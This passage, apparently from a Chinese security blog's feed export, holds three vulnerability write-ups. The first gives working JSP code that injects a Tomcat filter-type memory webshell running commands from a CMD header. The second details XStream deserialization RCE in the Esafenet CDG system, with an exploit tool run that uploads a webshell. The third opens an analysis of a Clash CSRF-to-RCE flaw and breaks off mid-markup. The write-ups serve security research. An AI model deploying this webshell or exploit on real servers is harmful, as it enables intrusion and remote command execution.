(HttpServletRequest)req;</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse)resp;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">                String osTyp;</span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">Scanner</span>(in)).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    chain.doFilter(req, resp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 FilterDef，兼容Tomcat 7和8</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">filterDefClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 8</span></span><br><span class="line">            filterDefClass = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            <span class="comment">// 7</span></span><br><span class="line">            filterDefClass = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">filterDef</span> <span class="operator">=</span> filterDefClass.newInstance();</span><br><span class="line">        filterDef.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterDef, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterName&#125;);</span><br><span class="line"></span><br><span class="line">        filterDef.getClass().getDeclaredMethod(<span class="string">&quot;setFilterClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterDef, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filter.getClass().getName()&#125;);</span><br><span class="line">        filterDef.getClass().getDeclaredMethod(<span class="string">&quot;setFilter&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Filter.class&#125;).invoke(filterDef, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filter&#125;);</span><br><span class="line">        standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addFilterDef&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;filterDefClass&#125;).invoke(standardContext, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterDef&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 FilterMap，，兼容Tomcat 7和8</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">filterMapClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Tomcat 8</span></span><br><span class="line">            filterMapClass = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// Tomcat 7</span></span><br><span class="line">            filterMapClass = Class.forName(<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">filterMap</span> <span class="operator">=</span> filterMapClass.newInstance();</span><br><span class="line">        filterMap.getClass().getDeclaredMethod(<span class="string">&quot;setFilterName&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterName&#125;);</span><br><span class="line">        filterMap.getClass().getDeclaredMethod(<span class="string">&quot;setDispatcher&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;DispatcherType.REQUEST.name()&#125;);</span><br><span class="line">        filterMap.getClass().getDeclaredMethod(<span class="string">&quot;addURLPattern&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;).invoke(filterMap, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用 addFilterMapBefore 会自动加到队列的最前面，不需要原来的手工去调整顺序了</span></span><br><span class="line">        standardContext.getClass().getDeclaredMethod(<span class="string">&quot;addFilterMapBefore&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;filterMapClass&#125;).invoke(standardContext, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;filterMap&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置 FilterConfig</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;org.apache.catalina.Context.class, filterDefClass&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        org.apache.catalina.core.<span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (org.apache.catalina.core.ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            map.put(filterName, filterConfig);</span><br><span class="line">            response.getWriter().write(<span class="string">&quot;Filter Mem Shell Successful Injection :)&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>最后验证如下，成功注入Filter型内存马并成功执行命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># curl http://192.168.1.102:7788/filterMemShell.jsp &amp;&amp; curl http://192.168.1.102:7788/ -H &quot;CMD: pwd&quot;</span></span><br><span class="line">Filter Mem Shell Successful Injection :)</span><br><span class="line"></span><br><span class="line">/opt/apache-tomcat/apache-tomcat-7.0.109/bin</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞</title>
      <link href="/cdg-xstream-deserialization-arbitrary-file-upload.html"/>
      <url>/cdg-xstream-deserialization-arbitrary-file-upload.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a><ul><li><a href="#%E6%81%B6%E6%84%8Fxml%E6%9E%84%E9%80%A0">恶意XML构造</a></li><li><a href="#%E7%BC%96%E7%A0%81">编码</a></li><li><a href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81">概念验证</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7">自动化工具</a></li></ul></li><li><a href="#0x04-references">0x04 References</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全防护软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产。亿赛通电子文档安全管理系统引用了低版本存在反序列化漏洞的XStream库，攻击者可利用该漏洞对服务器上传任意文件，进而控制服务器权限。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul><li>&lt;&#x3D; 820</li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>依赖位于<code>WEB-INF/lib/jhiberest.jar</code>文件，反编译后可以很明显的发现存在XStream的写法，并且XStream的版本用的也是低版本的，1.4.9版本。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/cdg-systemservice.png" alt="cdg-systemservice"></p><p>同时，此类在web.xml文件中的对应关系如下，由于CDG的Web根路径是<code>/CDGServer3</code>，那么当请求路径是<code>/CDGServer3/SystemService</code>时，请求将会由如下<code>com.esafenet.servlet.service.cdgfile.SystemService</code>类来处理。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>SystemService<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">com.esafenet.servlet.service.cdgfile.SystemService</span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也就是上图存在XStream的<code>SystemService</code>类，关键代码已贴至下面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemService</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Log</span> <span class="variable">log</span> <span class="operator">=</span> LogFactory.getLog(FilesService.class);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">retrunString</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">3607772408578536033L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> ServiceUtil.getStream();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">UserDao</span> <span class="variable">userDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserDao</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">UsbKeyDao</span> <span class="variable">usbKeyDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsbKeyDao</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SecretDocDao</span> <span class="variable">secretDocDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretDocDao</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SecretUserDao</span> <span class="variable">secretUserDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretUserDao</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;command&quot;</span>).toString();</span><br><span class="line">            <span class="keyword">if</span> (command != <span class="literal">null</span> &amp;&amp; command.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (CommandConstants.getCommandValue(command)) &#123;</span><br><span class="line">                    <span class="keyword">case</span> CommandConstants.GETSYSTEMINFO <span class="comment">/* 1601 */</span>:</span><br><span class="line">                        getSystemInfo(request, response);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getSystemInfo</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">SystemReturn</span> <span class="variable">systemReturn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SystemReturn</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">xmlStr</span> <span class="operator">=</span> ServiceUtil.getXMLFromRequest(request);</span><br><span class="line">            <span class="type">SystemServiceRequest</span> <span class="variable">systemServiceRequest</span> <span class="operator">=</span> (SystemServiceRequest)<span class="built_in">this</span>.xStream.fromXML(xmlStr);</span><br><span class="line">            systemReturn.setReturnMessage(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">            systemReturn.setSecretKey(DocInfoModel.getCDGKey());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">          </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;</span><br><span class="line">            retrunString = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">            log.error(<span class="string">&quot;取系统信息&quot;</span> + e2.getMessage());</span><br><span class="line">            systemReturn.setReturnMessage(ErrorConstants.SYSTEMSERVICE_ERROR);</span><br><span class="line">            ServiceUtil.sendInfo(request, response, <span class="built_in">this</span>.xStream.toXML(systemReturn));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要接收一个<code>command</code>参数，该参数值必须为<code>GETSYSTEMINFO</code>才会顺利进入到<code>getSystemInfo</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">xmlStr</span> <span class="operator">=</span> ServiceUtil.getXMLFromRequest(request);</span><br><span class="line"><span class="type">SystemServiceRequest</span> <span class="variable">systemServiceRequest</span> <span class="operator">=</span> (SystemServiceRequest)<span class="built_in">this</span>.xStream.fromXML(xmlStr);</span><br></pre></td></tr></table></figure><p>在触发XStream反序列化漏洞之前，<code>request</code>还经过<code>ServiceUtil.getXMLFromRequest</code>方法的一道处理，就是各种解码。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/serviceutil-getxmlfromrequest.png" alt="serviceutil-getxmlfromrequest"></p><p>对于此，倒也没必要通过其解码的操作来逆向编码的操作，因为负责编码的方法就是<code>changeXMLInfo</code>，后面在利用阶段直接调用该方法即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">changeXMLInfo</span><span class="params">(String str)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span>[] abyte1 = str.getBytes();</span><br><span class="line">    <span class="type">int</span> <span class="variable">nLength</span> <span class="operator">=</span> Array.getLength(abyte1);</span><br><span class="line">    CodeDecoder.Encode(abyte1, nLength, abyte0);</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(abyte1, <span class="string">&quot;ISO8859_1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> CodeDecoder.getTransferEncrptString(src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><blockquote><p>漏洞利用分为两步骤，第一步是构造出恶意的XStream反序列化XML Payload，第二步是将XML内容编码成亿赛通电子文档安全管理系统能够接受的字符串。</p></blockquote><h3 id="恶意XML构造"><a href="#恶意XML构造" class="headerlink" title="恶意XML构造"></a>恶意XML构造</h3><p>通过修改<a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">ysoserial-for-woodpecker</a>开源项目。在CommonsBeanutils2.java中做如下修改，接受的参数值为<code>upload_file_base64:..//webapps//CDGServer3//testttttt.txt|YWJjMTIz</code>，其中|前面的部分是上传至目标服务器的路径，而|后面的部分是上传的内容的base64值，<code>YWJjMTIz</code> base64解码后是abc123。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/ysoserial-for-woodpecker-cb2.png" alt="ysoserial-for-woodpecker-cb2"></p><p>在PayloadRunner.java中添加如下行。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/ysoserial-for-woodpecker-payloadrunner.png" alt="ysoserial-for-woodpecker-payloadrunner"></p><p>然后回到<code>CommonsBeanutils2.main()</code>点击Run，就会将恶意的XML内容生成并打印出来。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/cb2-run.png" alt="cb2-run"></p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>直接利用该jhiberest.jar包中的<code>changeXMLInfo</code>编码方法，同时注意还需导入其他的一些依赖包。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/encode-1.png" alt="encode-1"></p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/encode-2.png" alt="encode-2"></p><p>最终生成一串编码后的字符串。</p><h3 id="概念验证"><a href="#概念验证" class="headerlink" title="概念验证"></a>概念验证</h3><p>将上面生成的一段编码后的字符串复制至BurpSuite点击Send。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-1.png" alt="burp-1"></p><p>然后请求<code>/CDGServer3/testttttt.txt</code>路径，可以发现文件已成功上传。</p><p><img src="/img/post/cdg-xstream-deserialization-arbitrary-file-upload/burp-2.png" alt="burp-2"></p><h3 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h3><p>项目地址：</p><ul><li><a href="https://github.com/0xf4n9x/CDGXStreamDeserRCE">https://github.com/0xf4n9x/CDGXStreamDeserRCE</a></li></ul><p>本地文件上传利用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~/GitHub/CDGXStreamDeserRCE  ‹main*› $ cat tessssssssssssst1.jsp</span><br><span class="line">&lt;%</span><br><span class="line">out.println(&quot;e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">~/GitHub/CDGXStreamDeserRCE  ‹main*› $ java -jar CDGXStreamDeserRCE.jar -p http://127.0.0.1:8080 -uf tessssssssssssst1.jsp -t https://192.168.31.190:8443</span><br><span class="line">[+] Exploit Successed</span><br><span class="line">[+] WebShell: https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp</span><br><span class="line">~/GitHub/CDGXStreamDeserRCE  ‹main*› $ curl -k https://192.168.31.190:8443/CDGServer3/tessssssssssssst1.jsp</span><br><span class="line">e165421110ba030e165421110ba03099a1c0393373c5b4399a1c0393373c5b43</span><br></pre></td></tr></table></figure><p>字符串解码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CDGXStreamDeserRCE.jar -d FEPCCCLCENHIPOAFPAPDDFCGEAPNMDBMOJPMJAKKNPHOKIKIDCBPHEGKLDGNHCBDEIMODEKMKPFBAIMMNLOJJKMIICLAPJAAFGNGAKFBMPKPJMOIKODEJJMHJCCHKBMFMMFDLOMDPABOJCEAPOFDCPMKGDHFNBBIMCIPAMMIIANFPAJHFAABLLLANNIDAGNKOHONJGFGBKHFDMCLJIMICBHBJEIAAIMACN</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/40891670/209945515-1539ff6b-e4c4-46a3-8764-7aa3a7568741.png" alt="decode"></p><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04 References"></a>0x04 References</h2><ul><li><a href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">https://github.com/woodpecker-framework/ysoserial-for-woodpecker</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> deserialization </tag>
            
            <tag> xstream </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流行代理软件Clash CSRF未授权配置重载致使RCE</title>
      <link href="/clash-unauth-force-configs-csrf-rce.html"/>
      <url>/clash-unauth-force-configs-csrf-rce.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E5%85%B3%E4%BA%8EClash">0x00 关于Clash</a><ul><li><a href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A">名词解释</a></li><li><a href="#%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">基本使用</a><ul><li><a href="#Linux%E5%B9%B3%E5%8F%B0">Linux平台</a></li><li><a href="#macOS%E5%B9%B3%E5%8F%B0">macOS平台</a></li><li><a href="#Windows%E5%B9%B3%E5%8F%B0">Windows平台</a></li></ul></li><li><a href="#%E4%BD%BF%E7%94%A8Tips">使用Tips</a></li></ul></li><li><a href="#0x01-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">0x01 历史漏洞</a><ul><li><a href="#CFW-XSS2RCE-2022-x2F-02-x2F-23">CFW XSS2RCE - 2022&#x2F;02&#x2F;23</a></li><li><a href="#CFW%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E8%87%B4%E4%BD%BFparsers-JS-RCE-2023-x2F-01-x2F-13">CFW路径穿越致使parsers JS RCE - 2023&#x2F;01&#x2F;13</a></li></ul></li><li><a href="#0x02-%E4%B8%BB%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">0x02 主配置文件</a></li><li><a href="#0x03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%86%E6%9E%90">0x03 代码审计分析</a><ul><li><a href="#parse-providers">parse providers</a></li><li><a href="#initial-providers">initial providers</a></li><li><a href="#%E5%B0%8F%E7%BB%93">小结</a></li></ul></li><li><a href="#0x04-RESTful-API">0x04 RESTful API</a></li><li><a href="#0x05-CSRF2RCE">0x05 CSRF2RCE</a></li><li><a href="#0x06-%E6%80%BB%E7%BB%93">0x06 总结</a></li><li><a href="#0x07-%E6%97%B6%E9%97%B4%E7%BA%BF">0x07 时间线</a></li></ul><h2 id="0x00-关于Clash"><a href="#0x00-关于Clash" class="headerlink" title="0x00 关于Clash"></a>0x00 关于Clash</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><ul><li><p><a href="https://github.com/Dreamacro/clash">Clash</a></p><p>一个使用Golang编写的，支持Shadowsocks(R)、VMess、Trojan、Snell、SOCKS5、HTTP(S)等多个代理协议的代理工具。</p></li><li><p><a href="https://github.com/yichengchen/clashX">ClashX</a></p><p>旨在提供一个简单轻量化的开源GUI代理客户端，编写于Swift，仅支持MacOS平台。</p></li><li><p><a href="https://github.com/Fndroid/clash_for_windows_pkg">Clash for Windows</a>（简称CFW，后面统一使用简称）</p><p>编写于Electron的闭源GUI代理客户端，支持Windows&#x2F;MacOS&#x2F;Linux多个平台。</p></li></ul><p>以上是目前最流行的三款Clash系列相关的软件，Clash和ClashX源代码都是开源的，CFW是闭源的，ClashX与CFW这两个GUI工具的核心依然是前者Clash，即Clash是ClashX与CFW的上游。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h4 id="Linux平台"><a href="#Linux平台" class="headerlink" title="Linux平台"></a>Linux平台</h4><p>在Linux平台上，一般都是直接用go安装CLI的Clash进行使用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go install github.com/Dreamacro/clash@latest</span><br><span class="line">$ clash -v</span><br><span class="line">Clash unknown version linux amd64 with go1.19.1 unknown time</span><br></pre></td></tr></table></figure><p>为图使用方便，参考官方文档（<a href="https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service">https://github.com/Dreamacro/clash/wiki/Running-Clash-as-a-service</a>），将Clash通过systemd服务来管理运行，这里不过多赘述。</p><p>试着第一次运行它，可以发现它会自动创建目录和相关配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ clash</span><br><span class="line">INFO[0000] Can<span class="string">&#x27;t find config, create a initial config file</span></span><br><span class="line"><span class="string">INFO[0000] Can&#x27;</span>t find MMDB, start download</span><br><span class="line">INFO[0003] Mixed(http+socks) proxy listening at: 127.0.0.1:7890</span><br><span class="line">^C</span><br><span class="line">$ <span class="built_in">ls</span> ~/.config/clash/</span><br><span class="line">cache.db  config.yaml  Country.mmdb</span><br></pre></td></tr></table></figure><p>生成的默认配置显然是不能直接使用的。一般来说主配置文件的来源可能是自己在相应的提供商上买，也可以是去网上找其他人的分享。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;自动抓取tg频道、订阅地址、公开互联网上的ss、ssr、vmess、trojan节点信息&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/free-proxies-on-fofa.png" alt="free-proxies-on-fofa"></p><p><img src="/img/post/clash-unauth-force-configs-csrf-rce/proxypool.png" alt="proxypool"></p><p>将其下载下来，放到指定位置，就可以使用了。</p><figure class="highlight bash"><table><tr><td 